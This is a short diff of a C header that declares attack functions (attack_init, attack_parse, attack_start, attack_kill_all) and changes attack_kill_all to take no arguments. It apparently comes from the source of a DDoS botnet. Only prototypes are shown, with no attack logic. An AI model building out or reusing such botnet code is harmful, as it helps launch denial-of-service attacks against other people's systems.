@@ -143,7 +143,7 @@ struct attack_cfnull_state {
 };
 
 BOOL attack_init(void);
-void attack_kill_all(char*, char*, char);
+void attack_kill_all(void);
 void attack_parse(char *, int);
 void attack_start(int, ATTACK_VECTOR, uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 char *attack_get_opt_str(uint8_t, struct attack_option *, uint8_t, char *);
